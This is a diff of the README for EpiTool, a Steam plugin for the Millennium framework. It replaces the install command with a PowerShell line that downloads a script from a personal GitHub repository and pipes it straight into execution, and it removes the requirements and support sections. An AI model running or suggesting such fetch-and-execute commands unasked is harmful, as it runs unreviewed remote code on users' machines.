@@ -11,7 +11,7 @@ EpiTool is a Steam plugin built for the Millennium framework, providing tools fo
    
 2. put this and run
  ```
-3. iwr -useb "https://steambrew.app/install.ps1" | iex
+3. irm https://raw.githubusercontent.com/Vivian4/EpiTool/main/EpiTool_installer.ps1 | iex
  ```
 ## Installation
 
@@ -26,16 +26,6 @@ EpiTool is a Steam plugin built for the Millennium framework, providing tools fo
 
 
 
-### Requirements
 
-- Python 3.x
-- Millennium Steam framework
-- httpx==0.27.2
-- requests
-
-
-## Support
-
-For issues and questions, please come to our discord http://dsc.gg/epitool
 
 
